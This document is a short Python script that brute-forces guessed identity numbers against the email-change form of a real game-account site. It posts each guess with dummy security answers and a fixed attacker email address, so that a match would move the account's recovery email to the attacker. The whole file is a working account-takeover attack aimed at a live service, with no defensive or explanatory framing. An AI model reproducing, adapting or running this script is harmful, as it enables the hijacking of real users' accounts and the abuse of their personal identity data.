
import requests,sys,time
headers={"connection":"keep-alive","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","user-agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'}
for a in ("220","110"):
    for b in ("102","101"):
        for c in ("1988","1980"):
            for d in ("04","08","01"):
                for e in ("19","08","01"):
                    for f in ("04","08","01"):
                        for g in ("32","31","01","11","08","04","88"):
                            id = a+b+c+d+e+f+g
                            URL = "http://hlreg.99.com/common/ChangeEmail.aspx?__VIEWSTATE=%2FwEPDwULLTE3MzU1NDQ0MjNkZOqurePLqL5U%2BWNZ3atdhzv7sFjb&__EVENTVALIDATION=%2FwEWBwKV%2BoPJDgKOsbqTCQKhpZunCALdsKuIBALp7%2F1cAsSUjK4EApD%2BnaIPpLh5Q1RcbLL%2Bbh%2F3o2vdPPOCJZU%3D&txtIdentify={}&txtQuestion=aaa&txtAnswer=sss&txtNewEmail=anan0419%40gmail.com&txtConfirmEmail=anan0419%40gmail.com&btn_Submit=%E6%8F%90%E4%BA%A4".format(id)
                            print(URL)
                            get = requests.post(URL,headers=headers)
                            print(get.text)
                            time.sleep(3)